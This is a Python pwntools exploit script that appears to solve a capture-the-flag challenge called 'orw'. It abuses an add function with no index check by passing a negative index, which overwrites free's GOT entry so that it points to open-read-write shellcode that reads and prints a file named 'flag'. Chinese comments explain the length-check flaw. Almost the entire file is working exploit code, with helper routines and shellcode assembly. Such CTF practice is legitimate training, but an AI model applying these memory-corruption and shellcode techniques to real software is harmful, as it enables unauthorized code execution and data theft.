# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './orw'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add( idx , size , content):
    cmd(1)
    sla('index:',idx)
    sla('size:',size)
    sla('content:',content)

def delete( idx ):
    cmd(4)
    sla('index:',idx)

# one_gad = one_gadget(libc.path)

ptr_list = 0x0000000002020E0
free_got = 0x0000000000202018

# 这道题的读入数据很特殊，这是先读入，然后判读读入的长度是否到了 size 长度
# 那我们直接设 size 为0 
# 输入长度大于 1 ，那么他们永远不会相等
# add 没有检查负向溢出的 idx

shell  = asm(shellcraft.open('flag',0))
shell += asm(shellcraft.read(3,'rsp',0x100))
shell += asm(shellcraft.write(1, 'rsp',0x100))

add( -0xc8/8 , 0 , shell )
# dbg()
delete(0)

p.interactive()

'''
@File    :   orw.py
@Time    :   2021/10/06 15:22:00
@Author  :   Niyah 
'''